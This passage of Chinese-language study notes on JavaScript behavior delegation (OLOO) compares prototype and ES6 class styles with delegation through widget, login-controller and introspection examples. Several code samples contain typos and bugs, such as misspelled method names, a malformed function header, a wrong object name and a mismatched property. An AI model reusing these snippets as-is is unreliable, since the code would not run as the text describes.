output(label)&#125;&#125;class ABC inherits Task&#123; //..&#125; 现在可以实例化子类 XYZ 的一些副本然后使用这些实例来执行任务 “XYZ”。这些实例会复制 Task 定义的通用行为以及 XYZ 定义的特殊行为。同理，ABC 类的实例也会复制 Task 的行为和 ABC 的行为。在构造完成后，你通常只需要操作这些实例（而不是类），因为每个实例都有你需要完成任务的所有行为。 委托理论现在我们试着用委托行为来思考同样的问题。 首先你会定义一个名为 Task 的对象（它既不是对象也不是函数），它会包含所有任务都可以使用（写作使用，读作委托）的具体行为。接着，对于每个任务（“XYZ”,”ABC”）你都会定义一个对象来存储对应的数据和行为。把特定的任务对象都关联到 Task 功能对象上，让它们在需要的时候可以进行委托。 基本上可以想象成，执行任务的 “XYZ” 需要两个对象（XYZ 和 Task）协作完成，但是我们并不需要这些行为放在一起，通过类的复制，我们可以把它们分别放在各自独立的对象中，需要时可以运行 XYZ 对象委托给 Task。 下面是推荐的代码形式，非常简单： 1234567891011121314151617Task = &#123; setID:function(ID)&#123;this.id = ID&#125;, outputID:function)&#123;console.log(this.id)&#125;&#125;// 让 XYZ 委托 TaskXYZ = Object.create(Task);XYZ.prepareTask = function(ID,Label)&#123; this.setID(); this.label = Label;&#125;XYZ.outputTaskDetails = function()&#123; this.outputID(); console.log(this.label);&#125;// ABC = Object.create(Task);// ABC .. = ... 这段代码中，Task 和 XYZ 并不是类（或者函数），它们是对象。XYZ 通过 Object.create(..) 创建，它的 [[Prototype]] 委托了对象。 相比于面向类（或者说面向对象），作者会把这种编码风格称为“对象关联”（OLOO，object linked to other objects）。我们真正关心的是 XYZ 对象（和 ABC 对象）委托了 Task 对象。 在 JavaScript 中，[[Prototype]] 机制会把对象关联到其他对象。 对象关联风格的代码还有一些不足之处： 在上面的例子中，id 和 label 数据成员都是直接存在 XYZ 上（而不是 Task），通常来说，[[Prototype]] 委托中最好把状态保存在委托者（XYZ、ABC）而不是委托目标（Task）上。 在类设计模式中，故意让父类（Task）和子类（XYZ）中都有 outputTask 方法，这样就可以利用重写（多态）的优势，在委托行为中则恰好相反，我们会尽量避免在 [[Prototype]] 链的不同级别使用相同的命名，否则就需要使用笨拙并且脆弱的语法来消除引用歧义。 这个设计模式要求就进来少使用容易被重写的通用方法名，提倡使用更有描述性的方法名，尤其是写清相对对象行为的类型。这样做实际上可以创建出更容易理解和维护的代码。因为方法名（不仅在定义的位置，而是贯穿整个代码）更加清晰（自文档）。 this.setID(ID),XYZ 中的方法首先会寻找 XYZ 自身是否有 setID(..)，但是 XYZ 中并没有整个方法名，因为会通过 [[Prototype]] 委托关联到 Task 继续寻找，这时就可以找到 setID(..) 整个方法。此外，由于调用位置触发了 this 的隐式绑定规则，因此虽然 setID(..) 方法在 Task 中，运行时 this 仍然会绑定到 XYZ，这正是我们想要的。后面的outputID(..) 也是同样的原理。 换句话说，我们和 XYZ 进行交互时，可以使用 Task 中通用的方法，因为 XYZ 委托了 Task. 委托行为意味着某些对象（XYZ）在找不到属性或者方法引用时会把这个请求委托给另一个对象（Task）. 这个是一种极其强大的设计模式，和父类、子类、继承、多态等概念完全不同。对象并不是按照父类到子类的关系垂直组织的，而是通过任意方法的委托并排组织的。 在 API 接口的设计中，委托最好在内部实现，不用直接暴露出去。在之前的例子中我们没有让开发者通过 API 直接调用 XYZ.setID()（当然，可以这么做）。相反，我们把委托隐藏了在 API 内部，XYZ.propareTas() 会委托 Task.setID(..)。 1.相互委托( 禁止)你无法在两个或两个以上互相（双向）委托的对象之间创建循环委托。如果你把 B 关联到 A 然后试着把 A 关联到 B，就会出现。 这种方法是禁止的。如果你引用了一个两边都不存在的属性或者是方法，那就会在 [[Prototype]] 链上产生一个无限递归的循环。但是如果所有的引用都被严格限制的话，B是可以委托 A的，反之亦然。因为，互相委托理论上是可以正常工作的，在某些情况下这是非常有用的。 之所以要禁止互相委托，是因为引擎的开发者发现在设置时检查（并禁止）一次无限循环引用要更加高效，否则每次从对象中查找属性时都需要进行检查。 2.调试通常来说，JavaScript 规范并不会控制浏览器中开发者对于特定值或者结构的表达方式，浏览器和引擎可以自己选择合适的方式来解析，因此浏览器和工具的解析结构并不一定相同。比如下面的这段代码的结果只能在谷歌的开发者工具中看到。 这段传统的“类构造函数” JavaScript 代码在谷歌开发者工具的控制台中结果是这样的： 1234function Foo()&#123;&#125;var a1 = new Foo();a1; // Foo&#123;&#125;// 在 FireFox 中运行却是 Object&#123;&#125; 谷歌浏览器想说的 “{ } 是一个空对象，由名为 Foo 的函数构造”，Firefox 想说的是 “{} 是一个空对象，由Object 构造”，之所有有这种细微的差别，是因为谷歌会动态跟踪并把实际构造过程的函数当做一个内置属性，但是其他浏览器并不会跟踪这些额外的信息。 可以用 JavaScript 中的机制来解释一些谷歌的跟踪原理： 1234function Foo()&#123;&#125;var a1 = new Foo();a1.constructor(); // Foo()&#123;&#125;a1.constructor.name; //"Foo" 谷歌是不是直接输出了对象的 .constructor.name ？令人迷惑的是，答案既是又不是。 思考下面的代码： 123456function Foo()&#123;&#125;var a1 = new Foo();Foo.prototype.constructor = function Gotcha()&#123;&#125;;a1.constructor; // Gotcha()&#123;&#125;a1.constructor.name; // "Gotcha"a1; // Foo()&#123;&#125; 即使我们把 a1.constructor.name 修改为一个合理的值，谷歌浏览器的控制台仍然会输出 Foo。 所以上面的那个问题答案是“不是”。谷歌浏览器是通过另一种方式进行跟踪的。 12345678var Foo = &#123;&#125;;var a1 = Object.create(Foo);a1; // Object&#123;&#125;Object.defineProperty(Foo,"constructor",&#123; enumerable:false, value:function Gotcha()&#123;&#125;&#125;);a1; //Gotcha&#123;&#125; 这个bug现在已经被修复了，谷歌浏览器内部跟踪（只用于调试输出）“构造函数名称”的方法是它自身的一种扩展行为，并不包含在 JavaScript 规范中。 如果使用的并不是 “构造函数”来生成对象，比如使用本章介绍的对象关联风格来编写代码，那么谷歌浏览器就无法跟踪对象内部的 “构造函数名称”，这样的对象输出的就是 “Object{}”，意思是“Object() 构造出来的对象”。 当然，这并不是对象关联的风格的缺点，当你使用对象关联风格来编写代码并使用行为委托设计模式时，并不需要关注谁“构造了”对象（就是使用 new 来编写的那个函数）。只有使用类风格来编写代码时，谷歌浏览器内部的 “构造函数名称”跟踪才有意义，使用对象关联时这个功能起不到任何的作用。 比较思维模型现在已经明白了“类”和“委托”这两种设计模式的理论区别，接下来看看他们在思维模型方面的区别。 通过一些实例代码来比较一下两种设计模式（面向对象和对象关联）具体的实现方法，下面是典型（“原型”）面向对象风格： 123456789101112131415161718function Foo(who)&#123; this.me = who;&#125;Foo.prototype.identify = function()&#123; return "I am" + this.me;&#125;function Bar(who)&#123; Foo.call(this,who);&#125;Bar.prototype = Object.create(Foo.prototype);Bar.prototype.speak = function()&#123; alert('Hello,'+this.identify()+".");&#125;var b1 = new Bar("b1");var b2 = new Bar("b2");b1.speak();b2.speak(); 子类 Bar 委托了 父类 Foo,然后生成了 b1 和 b2 两个实例。b1 委托了 Bar.prototype,Bar.prototype 委托了Foo.prototype。 下面看看如何使用面向对象关联风格来编写完全相同的代码： 123456789101112131415161718Foo = &#123; init:function(who)&#123; this.me = who; &#125; identify:function()&#123; return "I am" + this.me; &#125;&#125;Bar = Object.create(Foo);Bar.speak = function()&#123; alert('Hello,'+this.identify()+".");&#125;var b1 = Object.create(Bar);var b2 = Object.create(Bar); b1.init();b2.init();b1.speak();b2.speak(); 这段代码中我们同样利用了 [[Prototype]] 把b1 委托给了 Bar 并把 Bar 委托给了 Foo,和上一段方面一模一样，我们仍然实现了三个对象之间的关联。 但是非常重要的一点是，这段代码简洁了很多。我们只是把对象关联起来，并不需要那些既复杂又令人困惑的模仿类的行为（构造函数、原型已经 new）. 首先，类风格的代码的思维模型强调实体以及实体间的关系 之行为委托-类风格代码的思维模型.png) 看起来很复杂，从图中可以看出这是一张非常复杂的关系图，此外，你跟着图片中的箭头走就会发现，JavaScript 中有很强的内部连贯性。 举个例子，JavaScript 指哪个的函数之所以可以访问 call、apply、bind 是因为函数本身也是对象。而函数对象同样有 [[Prototype]] 属性并关联到 Function.prototype 对象，因此所有函数对象都可以通过委托来调用这些默认方法。 下面看简化版的，更加清晰——只展示了必要的对象和关系： 之行为委托-类风格代码的思维模型(简化版).png) 虚线表示的是 Bar.prototype 继承 Foo.prototype 之后丢失的 .constructor 属性引用，它们还没有被修复。即使移除这些虚线，这个思维模型在你处理关联时仍然非常复杂。 看看对象关联风格代码的思维模型： 之行为委托-对象关联风格代码的思维模型) 通过这些可以看出，对象关联风格的代码显然更加简洁，因为这种代码只关注一件事情：对象之间的关联关系。 其他 “类”技巧都是非常复杂并且令人困惑的。去掉它们之后，事情会变得简单许多（同时保留所有功能）。 类和对象我们已经看到了 “类” 和 “行为委托”在理论和思维模型方面的区别，现在看看真实场景如何应用这些方法。 看看 Web 开发中非常经典的一些前端场景：创建 UI 控件（按钮、下拉列表等等）。 控件“类”可能你已经习惯了面向对象的设计模式，所以很快会想到一个包含所有通用控件行为的父类和继承父类的特殊控件子类。 这里将使用JQ 来操作 DOM 和 CSS，因为这些操作和我们讨论的内容没有太多的关系。 下面这段代码展示的是如何不使用任何 “类”辅助库或者语法的情况下，使用 纯 JavaScript 实现 类风格的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041// 父类function Widget(width,height)&#123; this.width = width || 50; this.height = height || 50; this.$elem = null;&#125;Widget.prototype.render = function($where)&#123; if(this.$elem)&#123; this.$elem.css(&#123; width:this.width + 'px', height:this.height + 'px', &#125;).appendTo($where); &#125;&#125;// 子类function Button(width,height,label)&#123; // 调用 “super” 构造函数 Widget.call(this,width,height); this.label = label || "Default"; this.$elem = $("&lt;button&gt;").text(this.label);&#125;// 让 Button 继承 WidgetButton.prototype = Object.create(Widget.prototype);// 重写 render(...)Button.prototype.render = function($where)&#123; // “super” 调用 Widget.prototype.render.call(this,$where); this.$elem.click(this.onClick.bind(this));&#125;Button.prototype.onClick = function(evt)&#123; console.log("Button "+ this.label +" clicked!");&#125;$(document).ready(function()&#123; var $body = $(document.body); var btn1 = new Button(125,30,"Hello"); var btn2 = new Button(150,40,"World"); btn1.render($body); btn2.render($body);&#125;); 在面向对象设计模式中我们需要现在父类中定义基础的 render(..)，然后在子类中重写它。子类并不会替换基础的 render(..)，只是添加了一些按钮特有的欣慰。可以看到代码中丑陋的显式伪多态，即通过 Widget.call 和 Widget.prototype.render.call 从“子类”方法中引用“父类”中的基础方法。 ES6 的 class 语法糖简单介绍如何使用 class 来实现相同的功能： 123456789101112131415161718192021222324252627282930313233343536373839// 父类class Widget&#123; constructor(width,height)&#123; this.width = width || 50; this.height = height || 50; this.$elem = null; &#125; render($where)&#123; if(this.$elem)&#123; this.$elem.css(&#123; width:this.width + 'px', height:this.height + 'px', &#125;).appendTo($where); &#125; &#125;&#125;class Button extends Widget&#123; constructor(width,height,label)&#123; super(width,height); this.label = label || "Default"; this.$elem = $("&lt;button&gt;").text(this.label); &#125; render($where)&#123; super.render($where) this.$elem.click(this.onClick.bind(this)); &#125; onClick(evt)&#123; console.log("Button "+ this.label +" clicked!"); &#125;&#125;$(document).ready(function()&#123; var $body = $(document.body); var btn1 = new Button(125,30,"Hello"); var btn2 = new Button(150,40,"World"); btn1.render($body); btn2.render($body);&#125;); 毫无疑问，使用了 ES6 的 class之后，上一段代码中很多丑陋的语法都不见了，super(..) 函数很棒。 尽管语法上得到了改进，但实际上这里并没有真正的类，class 仍然是通过 [[Prototype]] 机制实现的，因为我们仍然面临思维模式不匹配的问题。 无论你使用传统的原型语法还是 ES6 新语法糖，仍然需要用 “类”的概念来对问题进行建模。 委托控件对象下面的例子使用对象关联风格委托来简单实现 Widget/Button： 12345678910111213141516171819202122232425262728293031323334353637383940var Widget = &#123; init:function(width,height)&#123; this.width = width || 50; this.height = height || 50; this.$elem = null; &#125;, insert:function($where)&#123; if(this.$elem)&#123; this.$elem.css(&#123; width:this.width + 'px', height:this.height + 'px', &#125;).appendTo($where); &#125; &#125;&#125;;var Button = Object.create(Widget);Button.setup = function(width,height,label)&#123; // 委托调用 this.init(width,height); this.label = label || "Default"; this.$elem = $("&lt;button&gt;").text(this.label); &#125;Button.build = function($where)&#123; // 委托调用 this.insert($where) this.$elem.click(this.onClick.bind(this)); &#125;Button.OnClick = function(evt)&#123; console.log("Button "+ this.label +" clicked!");&#125;$(document).ready(function()&#123; var $body = $(document.body); var btn1 = Object.create(Button); var btn2 = Object.create(Button); btn1.setup(125,30,"Hello"); btn1.setup(150,40,"World"); btn1.build($body); btn2.build($body);&#125;); 使用对象关联来编写代码时不需要把 Widget 和 Button 当做父类和子类，相反，Widget 只是一个对象，包含一个通用的函数，任何类型的控件都可以作为委托，Button 同样只是一个对象。 从设计模式的角度来说，我们并没有像类一样在两个对象中都定义相同的方法名 render(..) ，相反我们定义了两个更具有描述性的方法名（insert/build）。同理，初始化方法分别叫做 init 和 setup。 在委托设计的模式中，除了建议使用不相同的并且更具有描述性的方法名之外，还要通过对象关联避免使用丑陋的显式伪多态调用，而是用简单的相对委托调用 this.init() 和 this.insert。 从语法角度来说，我们没有使用任何的构造函数 、.prototype 或者 new.实际上也没有必要使用它们。 仔细观察的话，会发现之前的一次调用 （var btn1 = new Button(125,30,”Hello”);）变成了两次（var btn1 = Object.create(Button);btn1.setup(125,30,”Hello”);）咋一看这似乎是一个缺点（需要更多的代码）。 但是这一点其实也是对象关联风格相比较传统原型风格代码的优势的地方，为什么？ 使用类构造的话，你需要（并不是硬性要求，但是强烈建议）在同一个步骤中实现构造和初始化。然后，许多情况下把这两步分开（就像对象关联代码一样）更灵活。 举例来说，假如在程序启动的时候创建一个实例池，然后一直等到实例被取出来并使用才执行特定的初始化过程。这个过程中两个函数调用是挨着的。但是完全可以根据需要让它们出现在不同的位置。 对象关联可以更好地支持关注分离（separation of concerns）原则，创建和初始化并不需要合并为一个步骤 更简洁的设计对象关联除了能让代码看起来更加简洁（并且就有更好的扩展性）外还可以通过行为委托模式简化代码结构。 下面的场景中我们有两个控制器对象，一个用来操作网页中的登录表单，一个用来与服务器进行验证（通信）。 我们需要一个辅助函数来创建 Ajax 通信，我们使用的是 jq，它不仅可以处理 Ajax 并且返回一个类 Promise 的结果，因此可以使用 .then() 来监听响应。 在传统的类设计模式中，我们会把基础的函数定义在名为 Controller 的类中，然后派生出两个子类 LoginController 和 AuthController ，它们都继承自 Controller 并且重写了一些基础行为： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182// 父类function Controller()&#123; this.error = [];&#125;Controller.prototype.showDialog = function(title,msg)&#123; // 给用户显示标题和消息&#125;Controller.prototype.success = function(msg)&#123; this.showDialog("Success",msg);&#125;Controller.prototype.failure = function(err)&#123; this.errors.push(err); this.showDialog("Error",msg);&#125;// 子类function LoginController()&#123; Controller.call(this);&#125;// 把子类关联到父类LoginController.prototype = Object.create(Controller.prototype);LoginController.prototype.getUser = function()&#123; return document.getElementById("login_username").value;&#125;LoginController.prototype.getPassword = function()&#123; return document.getElementById("login_password").value;&#125;LoginController.prototype.validateEntry = function(user,pw)&#123; user = user || this.getUser(); pw = pw || this.getPassword(); if(!(user &amp;&amp; pw))&#123; return this.failure("Please enter a username &amp; password!") &#125;else if(pw.length &lt; 5)&#123; return this.failure("Password must be 5+ characters!") &#125; // 如果这行到这里说明通过验证 return true;&#125;// 重写基础的 failure()LoginController.prototype.failure = function(err)&#123; // "super" 调用 Controller.prototype.failure.call(this,"Login invalid" + err);&#125;// 子类function AuthController(login)&#123; Controller.call(this); // 合成 this.login = login;&#125;// 把子类关联到父类AuthController.prototype = Object.create(Controller.prototype);AuthController.prototype.server = function(url,data)&#123; return $.ajax(&#123; url:url, data:data &#125;)&#125;AuthController.prototype.checkAuth = function()&#123; var user = this.login.getUser(); var pw = this.login.getPassword(); if(this.login.validateEntry(user,pw))&#123; this.server("/check-auth",&#123; user:user, pw:pw &#125;).then(this.succdess.bind(this)) .fail(this.failure.bind(this)) &#125;&#125;// 重写 successAuthController.prototype.success = function()&#123; // super 调用 Controller.prototype.success.call(this,"Authenticated!");&#125;// 重写 failureAuthController.prototype.failure = function()&#123; // super 调用 Controller.prototype.success.call(this,"Auth Failed: "+ err);&#125;// 除了继承，我们还要合成var auth = new AuthController(new LoginController);auth.checkAuth(); 所有控制器共享的基础行为是 success 和 failure 和 showDialog。子类 LoginController 和 AuthController 通过重写 failure 和 success 来扩展默认基础类行为。此外，注意 AuthController 需要一个 LoginController 的实例来登录表单进行交互，因此这个实例变成了一个数据属性。 另外还要注意的是，我们在继承的基础上进行了一些合成。AuthController 需要使用 LoginController ，因为我们实例化后者并用一个类成员属性 this.login 来引用它，这样 AuthController 就可以调用 LoginController 的行为了。 你可能想让 AuthController 继承 LoginController 或者相反，这样我们就通过继承实现了真正的合成，但是这就是类继承在问题领域建模时产生的问题，因为 AutController 和 LoginController 都不具备对方的基础行为，所以这种继承是不恰当的。我们的解决方法就是进行一些就简单的合成从而让它们既不必互相继承又可以互相合作。 反类但是，我们真的需要一个 Controller 父类，两个子类加上合成来对这个问题进行建模吗？能不能使用对象关联风格的行为委托来实现更简单的设计呢？当然可以。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354var LoginController = &#123; error:[], getUser:function()&#123; return document.getElementById("login_username").value; &#125;, getPassword:function()&#123; return document.getElementById("login_password").value; &#125;, vaildateEntry:function(user,pw)&#123; user = user || this.getUser(); pw = pw || this.getPassword(); if(!(user &amp;&amp; pw))&#123; return this.failure("Please enter a username &amp; password!") &#125;else if(pw.length &lt; 5)&#123; return this.failure("Password must be 5+ characters!") &#125; // 如果这行到这里说明通过验证 return true; &#125;, showDialog:function()&#123; // 给用户显示标题和消息 &#125;, failure:function(err)&#123; this.error.push(err); this.showDialog("Error","Login invalid" + err); &#125;&#125;// 让 AuthController 委托 LoginControllervar AuthController = Object.create(LoginController);AuthController.errors = [];AuthController.checkAuth = function()&#123; var user = this.getUser(); var pw = this.getPassword(); if(this.validateEntry(user,pw))&#123; this.server("/check-auth",&#123; user:user, pw:pw &#125;) .then(this.accepted.bind(this)) .fail(this.rejected.bind(this)) &#125; &#125;AuthController.server = function(url,data)&#123; return $.ajax(&#123; url:url, data:data &#125;)&#125;AuthController.accepted = function()&#123; this.showDialog("Success","Authenticated!");&#125;Authenticated.rejected = function(err)&#123; this.failure("Auth Failed!",err); &#125; 由于 AuthController 只是一个对象，因为我们不需要实例化只要一行代码： 1AuthController.checkAuth(); 借助对象关联，可以简单地向上委托链上添加一个或者多个对象，而且同样不需要实例化： 12var controller1 = Object.create(AuthController);var controller2 = Object.create(AuthController); 在行为委托模式中，AuthController 和 LoginController 只是对象，它们之间是兄弟关系，并不是父类和子类的关系，代码中 AuthController 委托了 LoginController ，反向委托也可以。 这种模式的重点在于只需要两个实体（LoginController 和 AuthController ）,而之前的模式需要三个。 我们不需要 Controller 基本类来共享两个实体之间的行为，因为委托足以满足我们需要的功能，同样的，前面提到的，我们也不需要实例化类，因为它们根本就不是类，它们只是对象。此外，我们也不需要合成，因为两个对象可以通过委托进行合作。 最后，我们避免了面向类设计模式的多态。我们在不同的对象中没有使用的函数名 success 和 failure 这样就不需要使用丑陋的显式伪多态。相反，在 AuthController 中它们的名字分别是 accepted 和 rejected 可以更好地描述它们的行为。 总结：我们使用一种简单的设计来实现了相同的功能，这就是对象关联风格代码和行为委托设计模式的力量。 更好的语法ES6 的 class 语法可以简洁地定义为 类方法,这个特性让 class 乍看起来更有吸引力。 123class Foo()&#123; methodName()&#123;/*..*/&#125;&#125; 在 ES6 中，我们可以在任意对象的字面形式使用简洁方法声明（concise method declaration），所欲对象关联风格的对象还可以这样声明。 123456789var loginController = &#123; error:[], getUser()&#123; //,,, &#125;, getPassword()&#123; // ... &#125;&#125; 唯一的区别就是对象的字面形式仍然使用 “,”来隔开元素，而 class 不需要。 此外，在 ES6 中，可以使用对象的字面形式来改写之前繁杂的属性赋值语法，然后用 Object.setPrototypeOf(..) 来修改它的 [[Prototype]] 12345678910111213// 使用更好的对象字面形式语法和简洁方法var AuthController = &#123; error:[], checkAuth()&#123; //.. &#125;, server(url,data)&#123; //.. &#125;, //..&#125;;// 现在把 AuthController 关联到 LoginControllerObject.setPrototypeOf(AuthController,LoginController); 使用 ES6 的简洁方法可以让对象关联风格更加人性化（并且仍然比典型的原型风格更加简洁和优秀）。 反词法简洁方法有一个非常小但是非常重要的缺点，思考下面的代码： 1234var Foo = &#123; bar()&#123;/*..*/&#125;, baz:function baz()&#123;/*..*/&#125;&#125; 去掉语法糖之后的代码如下所示 1234var Foo = &#123; bar:function()&#123;/*..*/&#125;, baz:function baz()&#123;/*..*/&#125;&#125; 由于函数对象本身没有名称标识符，所以 bar 的缩写形式实际上会变成一个匿名函数表达式并且赋值给 bar 属性，相比之下，具名函数表达式会额外地给 .baz 属性附加一个词法名称标识符 baz。 在前面我们分析了匿名函数表达式的三大主要缺点，，匿名函数没有 name 标识符，会导致： 调用栈难以追踪 自我引用（递归、事件、（接触）绑定等等）更难 代码更难理解 简洁方法没有第一和第三个缺点。 去掉语法糖的版本使用的是匿名表达式，通常来说不会在追踪栈中添加 name ，但是简洁方法很特殊，会给对应的函数对象设置一个内部的 name 属性，这样的理论上可以用在追踪栈中。（但是追踪的具体实现是不同的，因为无法保证可以使用）。 简洁方法无法避免第二个缺点，它们不具备自我引用的词法标识符，思考下面的代码： 1234567891011121314var Foo = &#123; bar:function(x)&#123; if(x&lt;10)&#123; return Foo.bar(x*2); &#125; return x; &#125;, baz：function()&#123; if(x&lt;10)&#123; return Foo.baz(x*2); &#125; return x; &#125;&#125; 在上面的例子中使用 Foo.bar(x*2)就足够了，但是在许多情况下，无法使用这种方法，比如多个对象通过代理共享函数，使用 this 绑定，等等。这种情况下，最好使用的方法就是使用函数对象的 name 标识符来进行真正的自我引用。 使用简洁方法一定要小心这一点，如果需要自我引用的时候，那最好的方法就是使用传统的具名函数表达式来定义对应的函数，不要使用简洁方法。 内省内省就是检查实例的类型，类实例的内省主要目的是通过创建方式来判断对象的结构和功能。 下面的代码就是使用 instanceof 来推测对象的 a1 功能： 1234567891011function Foo()&#123; //..&#125;Foo.prototype.something = function()&#123; // ..&#125;var a1 = new Foo();//之后if(a1 instanceof Foo)&#123; a1.something();&#125; 因为 Foo.prototype(不是 Foo) 在 a1 的 [[Prototype]] 链上，所以 instanceof 可以告诉我们 a1 是 Foo 类的一个实例，知道了这一点之后，我们就可以认为 a1 有 Foo “类”描述的功能。 当然，Foo 类并不存在，只有一个普通的函数 Foo,它引用了 a1 委托的对象（Foo.prototype）。从语法角度来说，instanceof 似乎是检查 a1 和 Foo 的关系，但是实际上它想说的是 a1 和 Foo.prototype （引用的对象）是互相关联的。 instanceof 语法会产生语义困惑而且非常不直观，如果想检查对象a1 和某个对象的关系，那必须使用另一个引用该对象的函数才可以——你不可以判断两个对象是否关联。 之前介绍的抽象的 Foo/Bar/b1 例子，简单来说是这样的： 12345function Foo()&#123;&#125;Foo.prototype...function Bar()&#123;&#125;Bar.prototype = Object.create(Foo.prototype);var b1 = new Bar("b1"); 如果要使用 instanceof 和 .prototype 语义来检查上面例子中的实体的关系，那必须这样做： 1234567891011// 让 Foo 和 Bar 互相关联Bar.prototype instanceof Foo; // trueObject.getPrototypeOf(Bar.prototype) === Foo.prototype; // trueFoo.prototype.isPrototypeOf(Bar.prototype); // true// 让 b1 关联到 Foo 和 Barb1 instanceof Foo; // trueb1 instanceof Bar; // trueObject.getPrototypeOf(b1) === Bar.prototype; // trueBar.prototype.isPrototypeOf(b1); // trueFoo.prototype.isPrototypeOf(b1); // true 显然这是一种非常糟糕的方法，举例来说（使用类时）你最直观的想法可能是使用 Bar instanceof Foo(因为很容易把实例理解成继承)，但是在 JavaScript 中是行不通的，你必须使用 Bar.prototype instanceof Foo. 还有一种常见的但是很脆弱的内省模式，这种模式被称为鸭子类型。 123if(a1.something)&#123; a1.something();&#125; 我们并没有检查 a1 和 委托 something()函数的对象之间的关系，而是假设如果如果 a1 通过了 测试 a1.something 的话，那么 a1 就一定可以调用这个方法（无论这个方法是否存在于它本身或是委托到其他对象）。 但是 “鸭子类型”通常会在测试之外做出很多关于对象功能的假设，这会带来很多风险（或者说脆弱的设计）。 ES6 的 Promise 就是典型的 “鸭子模式”。 由于各种各样的原因，我们需要判断一个对象引用是否是 Promise ，但是判断的方法就是检查对象中是否有 then 方法，换句话说，如果对象中有 then 方法，ES6 的Promise 就会认为这个对象是“可持续的”（thenable），因此会期望它具有 Promise 的所有标准行为。 如果有一个不是 Promise 但是具有 then 方法的对象，那就千万不要把它用在 ES6 中的 Promise 机制中，否则会出错。 使用对象关联时，所有的对象都是通过 [[Prototype]] 委托相互关联的，下面是内省的方法 1234567// 让 Foo 和 Bar 互相关联Foo.isPrototypeOf(Bar); // trueObject.getPrototypeOf(Bar) === Foo; // true// 让 b1 关联到 Foo 和 BarFoo.isPrototypeOf(b1); // trueBar.isPrototypeOf(b1); // trueObject.getPrototypeOf(b1) === Bar; // true 我们没有使用 instanceof 因为它会产生一些和类有关的误解。我们认为 JavaScript 中对象关联比类风格的代码更加简洁（而且功能相同） 小结在软件架构中你可以选择是否使用类和继承设计模式，大多数开发者理所当然地认为类是唯一的代码组织方式，但是本章中我们看到另一种少见但是更强大的设计行为：行为委托。 行为委托认为对象之间是兄弟关系，互相委托，不是父类和子类的关系。JavaScript 的 [[Prototype]] 机制本质上就是行为委托机制。也就是说，我们可以选择在 JavaScript 中努力实现类机制，也可以拥抱更自然的 [[Prototype]] 委托机制。 当你只用对象设计代码时，不仅可以让语法更加简洁，而且可以让代码结构更加清晰。 对象关联（对象之前互相关联）是一种编码风格，它倡导的是直接创建和关联对象，不把它们抽象成类。对象关联可以用基于 [[Prototype]] 的行为委托非常自然地实现。 附录ES6 中的 Class类是一种可选的（而不是必须）的设计模式，而且在 JavaScript 这样的 [[Prototype]] 语言中实现类是很别扭的。 缺点：繁琐杂乱的 .prototype 引用、试图调用原型链上层同名函数时的显式伪多态以及不可靠、不美观容易被误解成“构造函数“的 .construtor。 除此之外，类设计其实还有更深刻的问题，传统面向类的语言中父子类，子和实例之间其实是复制操作，但是在 [[Prototype]] 中并没有复制，相反，它们之间只有委托关联。 对象关联代码和行为委托使用了 [[Prototype]] 而不是将它们藏起来，对比起简洁性可以看出，类并不适用 JavaScirpt. classES6 的 class 机制，会介绍它的工作原理以及是否改进了之前提到的缺点。 123456789101112131415161718192021222324252627282930313233343536373839// 父类class Widget&#123; constructor(width,height)&#123; this.width = width || 50; this.height = height || 50; this.$elem = null; &#125; render($where)&#123; if(this.$elem)&#123; this.$elem.css(&#123; width:this.width + 'px', height:this.height + 'px', &#125;).appendTo($where); &#125; &#125;&#125;class Button extends Widget&#123; constructor(width,height,label)&#123; super(width,height); this.label = label || "Default"; this.$elem = $("&lt;button&gt;").text(this.label); &#125; render($where)&#123; super.render($where) this.$elem.click(this.onClick.bind(this)); &#125; onClick(evt)&#123; console.log("Button "+ this.label +" clicked!"); &#125;&#125;$(document).ready(function()&#123; var $body = $(document.body); var btn1 = new Button(125,30,"Hello"); var btn2 = new Button(150,40,"World"); btn1.render($body); btn2.render($body);&#125;); 除了语法更加好看之外，ES6 还解决了什么问题呢？ 不再引用杂乱的 .prototype 了 Button 声明时直接“继承” 了 Widget，不再需要通过 Object.create(..) 来替换 .prototype 对象，也不需要设置 .__proto__ 或者 Object.setPrototypeOf(..) 可以通过 super(..) 来实现相对多态，这样任何防范都可以引用原型链上层的同名方法，可以解决之前提到的问题：构造函数不属于类，所以无法互相引用——super() 可以完美解决构造函数的问题。 class 字面语法不能声明属性（只能声明方法）。看起来这是一种限制，但是它会排除掉很多不好的情况，如果没有这种限制的话，原型链末端的实例可能会意外地获取其他地方的属性（这些属性隐式被所有“实例”所共享）。所以 ，class语法实际上可以帮你避免犯错。 可以通过 extends 很自然扩展对象（子）类型，甚至是内置的对象（子）类型，比如 Array，RegExp。没有 class ..extends 语法时，想实现这一点是非常困难的，基本上只有框架的作者才能搞懂这一点。但是现在可以轻而易举地做到。 平心而论,class 语法确实解决了典型原型风格代码中很多显而易见的（语法）问题和缺点。 class 陷阱然后，class 语法并没有解决所有的问题，在 JavaScript 中使用 “类”设计模式仍然存在许多深层问题。 首先，你可能会认为 ES6 的 class 语法是向 JavaScript 中引入了一种新的 “类”机制，其实不是这样的，class 基本上只是现有的 [[Prototype]] （委托！）机制的一种语法糖。 也就是说，class 并不会像传统面向类的语言一样在声明时静态复制所有的行为。如果修改或者替换了父“类”中的一个方法，那么子“类”和所有实例都会受到影响，因为它们在定义时并没有进行复制，只是适用基于 [[Prototype]] 的实时委托： 12345678910111213141516class C&#123; constructor()&#123; this.sum = Math.random(); &#125; rand()&#123; console.log("Random: "+this.num); &#125;&#125;var c1 = new C();c1.rand(); // "Random: 0.4546976..."C.prototype.rand = function()&#123; console.log("Random: "+Math.round(this.num * 1000));&#125;var c2 = new C();c2.rand(); // "Random: 867"c1.rand(); // "Random: 425" 为什么要使用本质上不是类的 class 语法？ ES6 的 class 语法不是让传统类和委托对象之间的区别更加难以发现和理解吗？ class 语法无法定义类成员属性(只能定义方法)，如果为了追踪实例之间的共享状态必须要这么做，那你就只能使用丑陋的 .prototype 语法，像这样： 12345678910111213141516171819class C&#123; constructor()&#123; // 确保修改的是共享状态而不是一个在实例上创建的一个屏蔽属性！ C.prototype.count++; // this.count 可以通过委托实现我们想要的功能 console.log("Hello: " + this.count); &#125;&#125;// 直接向 prototype 对象上添加一个共享状态C.prototype.count = 0；var c1 = new C();// Hello:1var c2 = new C();// Hello:2c1.count === 2; // truec1.count === c2.count; // true 这种方法最大的问题是，它违背了 class语法的本意，在实现中暴露（泄露）了 .prototype 如果使用 